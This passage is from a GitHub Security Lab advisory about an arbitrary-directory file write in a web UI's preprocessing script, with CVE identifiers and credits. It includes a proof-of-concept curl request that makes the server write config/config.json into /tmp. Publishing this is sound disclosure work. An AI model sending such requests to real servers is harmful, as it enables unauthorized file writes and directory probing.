The issue allows for writing `/config/config.json` file in arbitrary directory on the server. If a given directory path doesn’t exist, the application will return an error, so this vulnerability could also be used to gain information about existing directories on the server.

#### Proof of Concept

1. Run `webui_preprocess.py`. We assume here it is running on `localhost:7860`
2. Send the following request:
   ```
   curl -i -s -k -X $'POST' \
    -H $'Host: localhost:7860' -H $'Content-Length: 80' -H $'Content-Type: application/json' \
    --data-binary $'{\"data\":[\"/tmp\",8],\"event_data\":null,\"fn_index\":0,\"session_hash\":\"06f0laej69fm\"}' \
    $'http://localhost:7860/run/predict'

   ```
3. Observe, as visible in the payload in the previous step, that `config/config.json, has been created in the` /tmp` directory.

## CVE

* GHSL-2024-045 - CVE-2024-39685
* GHSL-2024-046 - CVE-2024-39686
* GHSL-2024-047 - CVE-2024-39688

## Credit

These issues were discovered and reported by GHSL team member [@sylwia-budzynska (Sylwia Budzynska)](https://github.com/sylwia-budzynska).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2024-045`, `GHSL-2024-046`, or `GHSL-2024-047` in any communication regarding these issues.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information


